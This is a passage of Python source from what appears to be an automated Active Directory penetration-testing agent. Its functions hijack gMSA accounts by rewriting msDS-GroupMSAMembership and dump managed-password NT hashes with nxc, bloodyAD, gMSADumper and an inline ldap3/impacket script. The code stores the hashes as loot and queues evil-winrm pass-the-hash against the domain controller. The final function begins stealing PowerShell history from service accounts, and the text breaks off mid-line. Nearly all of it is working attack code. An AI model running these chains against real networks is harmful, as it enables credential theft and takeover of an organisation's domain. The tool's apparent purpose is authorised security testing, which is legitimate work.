    # Avoid touching ldap3 if no usable secret — it would only produce a
    # confusing anonymous-bind error and slow the chain down.
    secret = _real_secret(password) or _real_nt_hash(nt_hash)
    if secret and not (SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")):
        try:
            import ldap3
            from ldap3.core.exceptions import LDAPException
            host = _dc_host_for_kerberos(domain, dc_ip) or dc_ip
            server = ldap3.Server(dc_ip, get_info=ldap3.NONE, connect_timeout=10)
            user_dn = f"{domain}\\{sam}"
            # NTLM bind accepts both plaintext password and "lm:nt" hash strings
            if nt_hash and not _real_secret(password):
                pw = f"aad3b435b51404eeaad3b435b51404ee:{_real_nt_hash(nt_hash)}"
            else:
                pw = _real_secret(password) or password
            conn = ldap3.Connection(
                server, user=user_dn, password=pw,
                authentication=ldap3.NTLM, auto_bind=True,
                receive_timeout=15,
            )
            base = ",".join(f"DC={p}" for p in domain.split(".") if p)
            conn.search(
                search_base=base,
                search_filter=f"(sAMAccountName={sam})",
                search_scope=ldap3.SUBTREE,
                attributes=["objectSid"],
                size_limit=1,
            )
            for entry in conn.entries:
                raw = str(getattr(entry, "objectSid", "") or "")
                m = sid_re.search(raw)
                if m:
                    try:
                        conn.unbind()
                    except Exception:
                        pass
                    return m.group(0)
            try:
                conn.unbind()
            except Exception:
                pass
        except Exception:
            pass

    # ── 3. nxc legacy fallback ───────────────────────────────────────────────
    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    host = _dc_host_for_kerberos(domain, dc_ip) if SESSION.get("use_kerberos") else dc_ip
    out = _nxc(
        f"ldap {shell_quote(host)} {auth} --search-filter '(sAMAccountName={sam})' "
        f"--attributes objectSid",
        timeout=30,
    )
    m = sid_re.search(out)
    return m.group(0) if m else ""


def _gmsa_pick_reader(domain: str, dc_ip: str, current_user: str,
                      current_pw: str, current_hash: str) -> dict:
    """Pick the best identity to bind as the gMSA password READER.

    Reader requirements: must be able to NTLM-bind (LDAPS) AND its SID must be
    the one we wrote into msDS-GroupMSAMembership. Order of preference:

      1. Current session user, IF it has plaintext password or NT hash AND is
         not in Protected Users (we can't tell that without trying — the
         caller will retry-on-fail). Same identity = simplest path.
      2. Any identity in agent_intel.valid_creds with a real password.
      3. Any owned_user with an NT hash.
      4. Fall back to current creds even if Kerberos-only (the script will
         try, and report the failure cleanly).
    """
    intel = _agent_intel()

    # Build candidate list: each entry is dict(user=, password=, nt_hash=, sid=)
    # Order matters — first entry that resolves a SID wins.
    #
    # Reader bind goes over NTLM. The current session user is often the ACL
    # holder *because* it's a privileged service account, which makes it
    # likely to be in Protected Users (NTLM blocked) or otherwise sensitive.
    # Prefer a separately-discovered valid credential (typically a normal
    # domain user surfaced by share-loot or initial access) — those almost
    # always permit NTLM. Fall back to the current user only if nothing
    # else is available.
    candidates: list[dict] = []

    for c in intel.get("valid_creds", []) or []:
        u, pw = c.get("user", ""), _real_secret(c.get("password", ""))
        if u and pw and u != current_user and not any(x["user"] == u for x in candidates):
            candidates.append({"user": u, "password": pw, "nt_hash": ""})

    for o in SESSION.get("owned_users", []) or []:
        u, h = o.get("user", ""), _real_nt_hash(o.get("nt_hash", ""))
        if u and h and u != current_user and not any(x["user"] == u for x in candidates):
            candidates.append({"user": u, "password": "", "nt_hash": h})

    # Current user goes last — it might be Protected-Users-bound and unable
    # to NTLM-bind, but if nothing else worked we still try it.
    if _real_secret(current_pw) or _real_nt_hash(current_hash):
        candidates.append({
            "user": current_user,
            "password": _real_secret(current_pw),
            "nt_hash": _real_nt_hash(current_hash),
        })

    if not candidates:
        candidates.append({
            "user": current_user, "password": current_pw, "nt_hash": current_hash,
        })

    # Resolve SID for each candidate; drop ones we can't resolve.
    enriched = []
    for c in candidates:
        sid = _resolve_user_sid(dc_ip, domain,
                                c["user"], c["password"], c["nt_hash"])
        if sid:
            c["sid"] = sid
            enriched.append(c)
    return enriched[0] if enriched else {}


def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
                       password: str = "", nt_hash: str = "",
                       target_gmsa: str = "") -> str:
    """Full gMSA hijack chain when the current principal has a write ACL
    (GenericWrite/GenericAll/WriteDACL/WriteOwner/WriteProperty) on a gMSA.

    Strategy for any domain where a principal can modify a gMSA object:

      WRITER  = current session principal (has the ACL edge)
      READER  = best NTLM-capable identity we already own (often a different
                user — e.g. a Protected-Users svc account writes, then a plain
                Domain User reads). When no separate identity is available the
                current principal is reused for both roles.

      1. Resolve READER's SID.
      2. Run tools/bin/gmsa_grant_and_dump.py wrapped in faketime so the
         skewed lab clock doesn't blow up the GSSAPI authenticator. The
         helper writes msDS-GroupMSAMembership granting RP/WP to READER's
         SID, then re-binds as READER over LDAPS and pulls
         msDS-ManagedPassword, computing the NT hash + AES128/256.
      3. Persist hash to SESSION.loot, owned_users, agent_intel.gmsa_hashes.
         Add the gMSA's host (the DC) as a winrm_target so the next picker
         tick attempts evil_winrm with the new credential.
      4. If the helper fails (no FQDN, GSSAPI broken even with faketime,
         ldap3 missing), fall back to the legacy bloodyAD + gMSADumper path.

    The READER/WRITER split handles common environments where the ACL holder
    is Kerberos-only or otherwise cannot directly perform the NTLM/LDAPS read.
    """
    intel = _agent_intel()

    # ── Pick target if not explicitly supplied ────────────────────────────────
    if not target_gmsa:
        for right, t in intel.get("acl_paths", []):
            t_str = _canonical_acl_target(t)
            if t_str.endswith("$") and re.search(
                r"GenericWrite|GenericAll|WriteDACL|WriteDacl|WriteOwner|WriteProperty",
                str(right), re.I,
            ):
                target_gmsa = t_str
                break
    target_gmsa = (target_gmsa or "").strip().strip("'\"")
    if not target_gmsa:
        return ("gMSA takeover failed: no $-suffix target with write ACL found in intel. "
                "Run acl_abuse_scan first to populate acl_paths.")
    if not target_gmsa.endswith("$"):
        target_gmsa += "$"

    # ── Pre-flight: choose WRITER + READER ───────────────────────────────────
    # WRITER = principal that has the GenericWrite ACL on the gMSA.
    # Prefer intel valid_creds whose user matches an acl_paths entry for this gMSA.
    # Fall back to the current session user.
    intel = _agent_intel()
    writer_user = username
    writer_pw   = _real_secret(password)
    writer_hash = _real_nt_hash(nt_hash)
    writer_kerb = _session_kerberos_usable(username, domain)

    gmsa_base = target_gmsa.rstrip("$").lower() if target_gmsa else ""
    for right, t in intel.get("acl_paths", []):
        t_str = _canonical_acl_target(t).rstrip("$").lower()
        if t_str == gmsa_base and re.search(
            r"GenericWrite|GenericAll|WriteDACL|WriteDacl|WriteOwner|WriteProperty",
            str(right), re.I,
        ):
            # Look for this ACL holder in valid_creds
            acl_holder = None
            for edge in intel.get("acl_paths", []):
                if len(edge) >= 2:
                    edge_right, edge_target = edge[0], edge[1]
                    if _canonical_acl_target(edge_target).rstrip("$").lower() == gmsa_base:
                        break
            # Try to match acl_paths source with valid_creds
            for c in intel.get("valid_creds", []):
                u = c.get("user", "")
                pw = _real_secret(c.get("password", ""))
                if u and pw and u.lower() != username.lower():
                    # Check if this user has write on this gMSA
                    for r2, t2 in intel.get("acl_paths", []):
                        t2_str = _canonical_acl_target(t2).rstrip("$").lower()
                        if (t2_str == gmsa_base
                                and re.search(r"GenericWrite|GenericAll|WriteDACL|WriteOwner|WriteProperty", str(r2), re.I)):
                            acl_holder = c
                            break
                    if acl_holder:
                        break
            if acl_holder:
                writer_user = acl_holder["user"]
                writer_pw   = _real_secret(acl_holder.get("password", ""))
                writer_hash = _real_nt_hash(acl_holder.get("nt_hash", ""))
                writer_kerb = False
            break

    reader = _gmsa_pick_reader(domain, dc_ip, writer_user, writer_pw, writer_hash)
    if not reader:
        # Fall back to session user reader
        reader = _gmsa_pick_reader(domain, dc_ip, username, password, nt_hash)
    if not reader:
        return (f"gMSA takeover failed: could not resolve a reader SID. "
                f"Run enumerate_ldap to confirm credentials are accepted.")

    # ── Pre-fetch writer TGT (handles Protected Users / Kerberos-only accounts) ─
    writer_ccache = ""
    if writer_pw and not writer_kerb:
        writer_ccache = _getTGT(writer_user, writer_pw, domain, dc_ip)
        if writer_ccache:
            writer_kerb = True

    # ── Path A: ldap3-based atomic write+dump (preferred) ─────────────────────
    helper = Path(__file__).parent.parent.parent / "tools" / "bin" / "gmsa_grant_and_dump.py"
    helper_out = ""
    helper_rc  = -1
    if helper.exists():
        # FQDN required for GSSAPI SPN lookup.
        dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()
        krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)

        env = os.environ.copy()
        if writer_ccache:
            env["KRB5CCNAME"] = writer_ccache
        elif writer_kerb:
            env["KRB5CCNAME"] = SESSION["krb5_ccache"]
        if krb5_conf:
            env["KRB5_CONFIG"] = krb5_conf

        argv = ["faketime"] if (shutil.which("faketime") and _dc_time()) else []
        if argv:
            argv.append(_dc_time())
        argv += [_SYSPY, str(helper),
                 "--dc", dc_fqdn, "--domain", domain,
                 "--gmsa", target_gmsa.rstrip("$"),
                 "--writer-user", writer_user,
                 "--reader-user", reader["user"],
                 "--grantee-sid", reader["sid"]]

        # Prefer Kerberos ccache when available (handles Protected Users accounts)
        if writer_ccache or writer_kerb:
            argv.append("--writer-kerberos")
        elif writer_hash and not writer_pw:
            argv += ["--writer-hash", writer_hash]
        elif writer_pw:
            argv += ["--writer-pass", writer_pw]
        else:
            argv = []

        # Reader auth — NTLM by default (avoids the GSSAPI clock-skew tarpit).
        if reader.get("nt_hash"):
            argv += ["--reader-hash", reader["nt_hash"]]
        elif reader.get("password"):
            argv += ["--reader-pass", reader["password"]]
        else:
            # Reader has no usable secret — fall through to legacy path.
            argv = []

        if argv:
            try:
                r = subprocess.run(argv, capture_output=True, text=True,
                                   timeout=90, env=env)
                helper_out = _strip_ansi((r.stdout + r.stderr).strip())
                helper_rc  = r.returncode
            except Exception as e:
                helper_out = f"[ERROR] helper subprocess: {e}"
                helper_rc  = -2

    # Parse helper output for a hash regardless of return code (it sometimes
    # writes successful HASH lines while still exiting non-zero on a partial
    # later step).
    LM_SENTINEL = "aad3b435b51404eeaad3b435b51404ee"
    all_hashes: dict = {}
    for line in helper_out.splitlines():
        if not line.startswith("[HASH]"):
            continue
        acct_m = re.search(r"\b([\w\-]+\$)", line)
        if not acct_m:
            continue
        acct = acct_m.group(1)
        hex_tokens = [h for h in re.findall(r"\b([a-f0-9]{32})\b", line)
                      if h != LM_SENTINEL]
        if hex_tokens:
            all_hashes[acct] = hex_tokens[-1]

    aes_keys = {
        m.group(1): m.group(2) for m in
        re.finditer(r"\[AES256\]\s+(\S+):aes256-cts-hmac-sha1-96:([0-9a-f]+)",
                    helper_out)
    }
    write_done = "[WRITE-OK]" in helper_out

    # ── Path B: legacy bloodyAD + gMSADumper fallback ─────────────────────────
    legacy_out = ""
    if not all_hashes:
        krb_ok = _session_kerberos_usable(username, domain)
        if krb_ok:
            _prefetch_ldap_tgs(domain, dc_ip,
                               _dc_host_for_kerberos(domain, dc_ip))
        sddl = f"O:BAG:BAD:(A;;RPWP;;;{reader['sid']})"
        dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()

        # ── ldap3 inline write (avoids bloodyAD asyncio crash on Python 3.13) ──
        active_ccache = writer_ccache or (SESSION.get("krb5_ccache", "") if writer_kerb else "")
        ldap3_script = (
            "import sys,os,ldap3\n"
            "from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR,ACCESS_ALLOWED_ACE,ACL,LDAP_SID\n"
            f"os.environ['KRB5CCNAME']=r'{active_ccache}'\n"
            f"srv=ldap3.Server('{dc_fqdn}',port=636,use_ssl=True,get_info=ldap3.ALL)\n"
            f"conn=ldap3.Connection(srv,authentication=ldap3.SASL,sasl_mechanism=ldap3.KERBEROS,auto_bind=True)\n"
            f"base_dn='DC='+'DC='.join('{domain}'.split('.'))\n"
            f"conn.search(base_dn,'(sAMAccountName={target_gmsa})',attributes=['distinguishedName'])\n"
            "dn=conn.entries[0].distinguishedName.value if conn.entries else sys.exit(1)\n"
            "sd=SR_SECURITY_DESCRIPTOR();sd['Revision']=1;sd['Sbz1']=0;sd['Control']=0x8004\n"
            "sd['OffsetOwner']=0;sd['OffsetGroup']=0;sd['OffsetSacl']=0\n"
            "acl=ACL();acl['AclRevision']=4;acl['Sbz1']=0;acl['Sbz2']=0\n"
            "ace=ACCESS_ALLOWED_ACE();ace['AceType']=0;ace['AceFlags']=0\n"
            f"sid=LDAP_SID();sid.fromCanonical('{reader['sid']}')\n"
            "ace['Ace']['Sid']=sid;ace['Ace']['Mask']=0x30\n"
            "acl['Data']=ace.getData();acl['AclSize']=len(acl['Data'])+8;acl['AceCount']=1\n"
            "sd['Dacl']=acl\n"
            "ok=conn.modify(dn,{'msDS-GroupMSAMembership':[(ldap3.MODIFY_REPLACE,[sd.getData()])]})\n"
            "print('WRITE-OK' if ok else 'WRITE-FAIL',conn.result)\n"
        )
        ldap3_write_out = ""
        if active_ccache:
            try:
                lw = subprocess.run(
                    [_SYSPY, "-c", ldap3_script],
                    capture_output=True, text=True, timeout=20,
                    env={**os.environ, "KRB5CCNAME": active_ccache},
                )
                ldap3_write_out = _strip_ansi((lw.stdout + lw.stderr).strip())
                legacy_out += f"--- ldap3 inline write ---\n{ldap3_write_out[:400]}\n"
                if "WRITE-OK" in ldap3_write_out:
                    write_done = True
            except Exception as e:
                legacy_out += f"--- ldap3 inline write ---\n[ERROR] {e}\n"

        # ── bloodyAD write (fallback when ldap3 inline fails) ─────────────────
        if not write_done:
            bauth, benv = _bloodyad_auth(domain, writer_user, writer_pw, writer_hash, dc_ip)
            if not bauth:
                bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
            if bauth:
                if writer_ccache:
                    benv["KRB5CCNAME"] = writer_ccache
                for raw_flag in ("", " --raw"):
                    write_cmd = (
                        f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} set object "
                        f"{shell_quote(target_gmsa)} msDS-GroupMSAMembership "
                        f"-v {shell_quote(sddl)}{raw_flag}"
                    )
                    try:
                        wr = subprocess.run(write_cmd, shell=True, capture_output=True,
                                            text=True, timeout=30, env=benv)
                        wr_out = _strip_ansi((wr.stdout + wr.stderr).strip())
                        if wr.returncode == 0 or any(s in wr_out.lower() for s in (
                            "success", "modified", "write-ok", "insufficientaccessrights",
                            "constraintviolation", "unwillingtoperform",
                        )):
                            legacy_out += f"--- bloodyAD write{raw_flag} ---\n{wr_out[:400]}\n"
                            break
                        legacy_out += f"--- bloodyAD write{raw_flag} (rc={wr.returncode}) ---\n{wr_out[:300]}\n"
                    except Exception as e:
                        legacy_out += f"--- bloodyAD write ---\n[ERROR] {e}\n"
                        break

        # Try gMSADumper.py as second dump method.
        candidate_paths = [
            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
            Path("/usr/local/bin/gMSADumper.py"),
        ]
        dumper = next((str(p) for p in candidate_paths if p.exists()), "")
        if dumper:
            env = os.environ.copy()
            rdr_pw  = reader.get("password") or password
            rdr_nt = _real_nt_hash(reader.get("nt_hash", ""))
            if rdr_pw or rdr_nt:
                if rdr_nt and not rdr_pw:
                    rdr_pw = f"aad3b435b51404eeaad3b435b51404ee:{rdr_nt}"
                cmd = [_SYSPY, dumper, "-u", reader.get("user", username),
                       "-p", rdr_pw, "-d", domain, "-l", dc_ip]
            elif krb_ok:
                env["KRB5CCNAME"] = SESSION["krb5_ccache"]
                cmd = [_SYSPY, dumper, "-k", "-d", domain, "-l", dc_ip]
            else:
                cmd = []
            try:
                if cmd:
                    r = subprocess.run(cmd, capture_output=True, text=True,
                                       timeout=60, env=env)
                    dump_out = _strip_ansi((r.stdout + r.stderr).strip())
                    legacy_out += "--- gMSADumper ---\n" + dump_out[:1500] + "\n"
                    all_hashes.update(_extract_gmsa_hashes_from_text(dump_out))
                else:
                    legacy_out += "--- gMSADumper ---\nskipped: no reader secret or valid Kerberos ccache\n"
            except Exception as e:
                legacy_out += f"--- gMSADumper ---\n[ERROR] {e}\n"

        # Final fallback: nxc --gmsa with the reader identity.
        if not all_hashes:
            rdr_user = reader.get("user", username)
            rdr_pw   = reader.get("password", "")
            rdr_nt   = reader.get("nt_hash", "")
            nxc_auth = _auth_args_nxc(rdr_user, rdr_pw, rdr_nt, domain, dc_ip)
            nxc_host = _dc_host_for_kerberos(domain, dc_ip) if _session_kerberos_usable(rdr_user, domain) else dc_ip
            nxc_out  = _nxc(f"ldap {shell_quote(nxc_host)} {nxc_auth} --gmsa", timeout=30)
            legacy_out += "--- nxc --gmsa ---\n" + nxc_out[:800] + "\n"
            for line in nxc_out.splitlines():
                acct_m = re.search(r"\b([\w\-]+\$)", line)
                if not acct_m:
                    continue
                acct = acct_m.group(1)
                hex_tokens = [h for h in re.findall(r"\b([a-f0-9]{32})\b", line)
                              if h != LM_SENTINEL]
                if hex_tokens:
                    all_hashes[acct] = hex_tokens[-1]

    # ── Persist + add WinRM hint ──────────────────────────────────────────────
    if all_hashes:
        for acct, nt in all_hashes.items():
            SESSION.setdefault("loot", {})[acct] = nt
            SESSION.setdefault("agent_intel", {}).setdefault("gmsa_hashes", {})[acct] = nt
            SESSION.setdefault("owned_users", []).append({
                "user": acct, "method": "gMSA-takeover",
                "nt_hash": nt, "source": target_gmsa,
                "time": datetime.now().isoformat(),
            })
            if aes_keys.get(acct):
                SESSION["agent_intel"].setdefault("aes_keys", {})[acct] = aes_keys[acct]
            add_finding(
                "gMSA Takeover (msDS-GroupMSAMembership write)", "Critical",
                f"Wrote msDS-GroupMSAMembership on {acct} (granted to "
                f"{reader.get('user', username)}) → NT hash: {nt}",
                "Audit GenericWrite/WriteProperty on gMSA objects; restrict "
                "PrincipalsAllowedToRetrieveManagedPassword to a tight group.",
            )
        # Add the DC as a WinRM target so _pick_next_tool grabs evil_winrm next.
        wt = SESSION["agent_intel"].setdefault("winrm_targets", [])
        for host in (_dc_host_for_kerberos(domain, dc_ip), dc_ip):
            if host and host not in wt:
                wt.append(host)
        save_session()
        first_acct, first_nt = next(iter(all_hashes.items()))
        return (
            f"gMSA TAKEOVER SUCCESS: {first_acct} → NT:{first_nt}\n"
            f"Granted to: {reader.get('user', username)} (sid={reader['sid']})\n"
            f"All hashes: {all_hashes}\n"
            f"--- helper rc={helper_rc} ---\n{helper_out[:1200]}\n"
            f"{legacy_out[:1200]}\n"
            f"NEXT: evil_winrm with username={first_acct} nt_hash={first_nt}"
        )

    return (
        f"gMSA takeover did not yield hash for {target_gmsa} "
        f"(reader={reader.get('user','?')} sid={reader.get('sid','?')} "
        f"helper_rc={helper_rc} write_done={write_done}).\n"
        f"--- helper output ---\n{helper_out[:1500]}\n"
        f"{legacy_out[:1500]}\n"
        f"Hint: confirm the reader's SID has WriteProperty on "
        f"msDS-GroupMSAMembership and that the DC FQDN resolves so GSSAPI can "
        f"find ldap/<fqdn> SPN. Try installing faketime if clock skew is large."
    )


def tool_gmsa_read(dc_ip: str, domain: str, username: str,
                   password: str = "", nt_hash: str = "") -> str:
    """Read gMSA (Group Managed Service Account) password hashes.
    Works cross-domain. Returns NT hash for Pass-the-Hash.
    Requires: ReadGMSAPassword ACL on the gMSA object."""
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    intel = SESSION.setdefault("agent_intel", {})
    tried_for = intel.setdefault("gmsa_read_tried_for", [])
    if username and not any(_same_ad_account(username, seen) for seen in tried_for):
        tried_for.append(username)
    pivot_ccache = ""
    for cred in intel.get("valid_creds", []) or []:
        if not isinstance(cred, dict):
            continue
        if not _same_ad_account(username, str(cred.get("user", ""))):
            continue
        cc = str(cred.get("ccache", "") or "")
        if cc and _ccache_is_valid(cc, username, domain):
            pivot_ccache = cc
            break
    if pivot_ccache:
        SESSION["use_kerberos"] = True
        SESSION["krb5_ccache"] = pivot_ccache
        os.environ["KRB5CCNAME"] = pivot_ccache
        password = ""
        nt_hash = ""
    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    # nxc ldap --gmsa (try LDAP first, then LDAPS on channel-binding errors)
    nxc_host = _dc_host_for_kerberos(domain, dc_ip) if _session_kerberos_usable(username, domain) and not (password or nt_hash) else dc_ip
    out1 = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa", timeout=30)
    # Channel binding error (data 576 / 80090346) → retry on LDAPS port 636
    if any(s in out1.lower() for s in ("80090346", "data 576", "channel binding")):
        out1_ldaps = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa --port 636", timeout=30)
        if out1_ldaps and "error" not in out1_ldaps.lower():
            out1 = out1_ldaps
        else:
            out1 += f"\n=== LDAPS retry ===\n{out1_ldaps[:400]}"
    # Also try via bloodyAD
    bloodyauth, bloodyenv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
    if bloodyauth:
        cmd = (
            f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloodyauth} "
            "get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' "
            "--attr sAMAccountName,msDS-ManagedPassword --raw"
        )
        try:
            r = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=20, env=bloodyenv,
            )
            out2 = _strip_ansi((r.stdout + r.stderr).strip())
        except Exception as e:
            out2 = f"[ERROR] {e}"
        if "NoResultError" in out2 or "No object found" in out2:
            out2 = "No gMSA objects found/readable via bloodyAD search."
        elif any(x in out2.lower() for x in ("traceback", "[error]", "invalidcredentials", "failed")):
            out2 = _compact_tool_failure(out2)
    else:
        out2 = "bloodyAD skipped: no usable auth material."

    # gMSADumper is a generic fallback and often succeeds when a specific
    # bloodyAD build has LDAP/client issues.
    dump_out = ""
    if not _extract_gmsa_hashes_from_text(f"{out1}\n{out2}"):
        dumper = next((str(p) for p in (
            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
            Path("/usr/local/bin/gMSADumper.py"),
        ) if p.exists()), "")
        if dumper:
            env = os.environ.copy()
            if nt_hash and not password:
                reader_secret = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
                cmd = [_SYSPY, dumper, "-u", username, "-p", reader_secret,
                       "-d", domain, "-l", dc_ip]
            elif password:
                cmd = [_SYSPY, dumper, "-u", username, "-p", password,
                       "-d", domain, "-l", dc_ip]
            elif _session_kerberos_usable(username, domain):
                env["KRB5CCNAME"] = SESSION["krb5_ccache"]
                cmd = [_SYSPY, dumper, "-k", "-d", domain, "-l", dc_ip]
            else:
                cmd = []
            if cmd:
                try:
                    r = subprocess.run(cmd, capture_output=True, text=True,
                                       timeout=60, env=env)
                    dump_out = _strip_ansi((r.stdout + r.stderr).strip())
                    if "Traceback (most recent call last)" in dump_out:
                        dump_out = _compact_tool_failure(dump_out)
                except Exception as e:
                    dump_out = f"[ERROR] {e}"
            else:
                dump_out = "gMSADumper skipped: no usable password, NT hash, or valid Kerberos ccache."
        else:
            dump_out = "gMSADumper skipped: helper not found."

    combined_initial = f"{out1}\n{out2}\n{dump_out}"
    auth_denied = any(s in combined_initial.lower() for s in (
        "invalidcredentials", "sec_e_logon_denied", "status_logon_failure",
        "automatic bind not successful - invalidcredentials",
        "from ccache 576", "successful bind must be completed",
    ))

    kerb_retry = ""
    if auth_denied and password and not _extract_gmsa_hashes_from_text(combined_initial):
        new_ccache = _getTGT(username, password, domain, dc_ip)
        if new_ccache:
            SESSION["use_kerberos"] = True
            SESSION["krb5_ccache"] = new_ccache
            os.environ["KRB5CCNAME"] = new_ccache
            dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
            _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn)
            kerb_auth = f"-u '{username}' -k --use-kcache --kdcHost {dc_ip} -d {domain}"
            out1k = _nxc(f"ldap {shell_quote(dc_fqdn)} {kerb_auth} --gmsa", timeout=30)

            out2k = ""
            bloodyauth_k, bloodyenv_k = _bloodyad_auth(domain, username, "", "", dc_ip)
            if bloodyauth_k:
                cmd = (
                    f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloodyauth_k} "
                    "get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' "
                    "--attr sAMAccountName,msDS-ManagedPassword --raw"
                )
                try:
                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                       timeout=25, env=bloodyenv_k)
                    out2k = _strip_ansi((r.stdout + r.stderr).strip())
                    if "Traceback (most recent call last)" in out2k:
                        out2k = _compact_tool_failure(out2k)
                except Exception as e:
                    out2k = f"[ERROR] {e}"

            dump_k = ""
            dumper = next((str(p) for p in (
                Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
                Path("/usr/local/bin/gMSADumper.py"),
            ) if p.exists()), "")
            if dumper:
                env = os.environ.copy()
                env["KRB5CCNAME"] = new_ccache
                try:
                    r = subprocess.run([_SYSPY, dumper, "-k", "-d", domain, "-l", dc_ip],
                                       capture_output=True, text=True, timeout=60, env=env)
                    dump_k = _strip_ansi((r.stdout + r.stderr).strip())
                    if "Traceback (most recent call last)" in dump_k:
                        dump_k = _compact_tool_failure(dump_k)
                except Exception as e:
                    dump_k = f"[ERROR] {e}"

            kerb_retry = (
                "=== Kerberos retry after NTLM bind denial ===\n"
                f"ccache: {new_ccache}\n"
                f"--- NXC Kerberos gMSA ---\n{out1k}\n"
                f"--- bloodyAD Kerberos gMSA ---\n{out2k or 'skipped'}\n"
                f"--- gMSADumper Kerberos ---\n{dump_k or 'skipped'}"
            )
            if not _extract_gmsa_hashes_from_text(kerb_retry) and any(
                    s in kerb_retry.lower() for s in (
                        "from ccache 576", "successful bind must be completed",
                        "invalidcredentials", "sec_e_logon_denied",
                        "not successful - invalidcredentials",
                    )):
                dead = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_read_dead_for", [])
                if not any(_same_ad_account(username, d) for d in dead):
                    dead.append(username)
                kerb_retry += (
                    "\n[gmsa_read dead-path] Kerberos retry did not produce a readable "
                    "managed-password blob for this principal."
                )
        else:
            dead = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_read_dead_for", [])
            if not any(_same_ad_account(username, d) for d in dead):
                dead.append(username)
            kerb_retry = (
                "=== Kerberos retry after NTLM bind denial ===\n"
                "TGT request failed; marking gmsa_read dead for this principal. "
                "Continue with gmsa_takeover if a write ACL exists, or pivot to another credential."
            )

    results = [
        f"=== NXC gMSA ===\n{out1}",
        f"=== bloodyAD gMSA ===\n{out2}",
    ]
    if dump_out:
        results.append(f"=== gMSADumper fallback ===\n{dump_out}")
    if kerb_retry:
        results.append(kerb_retry)

    # Extract hashes from both normal dumper output and raw bloodyAD blobs.
    hashes_by_acct = _valid_gmsa_hashes(
        _extract_gmsa_hashes_from_text(f"{out1}\n{out2}\n{dump_out}\n{kerb_retry}")
    )
    hashes = list(hashes_by_acct.items())
    if hashes:
        for acct, nt in hashes:
            add_finding("gMSA Password Readable", "Critical",
                        f"gMSA {acct} NT hash obtained: {nt}",
                        "Audit ReadGMSAPassword ACL; restrict gMSA read access")
            SESSION.setdefault("loot", {})[acct] = nt
            SESSION.setdefault("agent_intel", {}).setdefault("gmsa_hashes", {})[acct] = nt
            if not any(o.get("user") == acct and o.get("nt_hash") == nt
                       for o in SESSION.get("owned_users", [])):
                SESSION["owned_users"].append({"user": acct, "method": "gMSA",
                                               "nt_hash": nt,
                                               "time": datetime.now().isoformat()})
        wt = SESSION.setdefault("agent_intel", {}).setdefault("winrm_targets", [])
        for host in (_dc_host_for_kerberos(domain, dc_ip), dc_ip):
            if host and host not in wt:
                wt.append(host)
        save_session()
        results.append(f"HASHES: {hashes}")
        acct, nt = hashes[0]
        results.append(f"NEXT: evil_winrm with username={acct} nt_hash={nt}")
    else:
        # No readable managed password for this principal — covers ALL no-result
        # modes, including "<no read permissions>" (a SUCCESSFUL query that yields
        # nothing usable, not a bind error, so the auth-denial branch above never
        # fires). Mark gmsa_read dead for this user so the rule engine pivots
        # instead of re-selecting gmsa_read every round (infinite loop). Generic.
        dead = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_read_dead_for", [])
        if not any(_same_ad_account(username, d) for d in dead):
            dead.append(username)
            save_session()
        results.append(
            "[gmsa_read dead-path] No readable gMSA managed password for this "
            "principal — marking gmsa_read dead. Pivot to a principal allowed to "
            "read it (per the gMSA's PrincipalsAllowedToReadPassword), or use "
            "gmsa_takeover if a write edge exists."
        )
    return "\n\n".join(results)


def tool_jea_enum(dc_ip: str, domain: str, username: str,
                  password: str = "", nt_hash: str = "") -> str:
    """Enumerate JEA (Just Enough Administration) endpoints and attempt history theft.
    Reads PSReadLine history, checks constrained session capabilities,
    and attempts credential recovery from PowerShell history files."""
    fqdn = SESSION.get("dc_fqdn") or dc_ip
    results = []

    # Test WinRM first
    auth_nxc = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    winrm_test = _nxc(f"winrm {dc_ip} {auth_nxc}", timeout=15)
    results.append(f"=== WinRM Test ===\n{winrm_test[:500]}")

    # pypsrp for JEA — try reading PSReadLine history from common service account paths
    history_paths = [
        "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    ]

    # Build evil-winrm command for history reading
    krb = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    if krb:
        winrm_cmd = f"KRB5CCNAME={SESSION['krb5_ccache']} evil-winrm -i {fqdn} -r {domain.upper()}"
    elif nt_hash:
        nt = nt_hash.split(":")[-1]
        winrm_cmd = f"evil-winrm -i {dc_ip} -u '{username}' -H '{nt}'"
    else:
        winrm_cmd = f"evil-winrm -i {dc_ip} -u '{username}' -p '{password}'"

    # Try to read history files via nxc smb read
    for path in history_paths:
        user_path = path.format(username)
        out = _nxc(f"smb {dc_ip} {auth_nxc} --get-file "
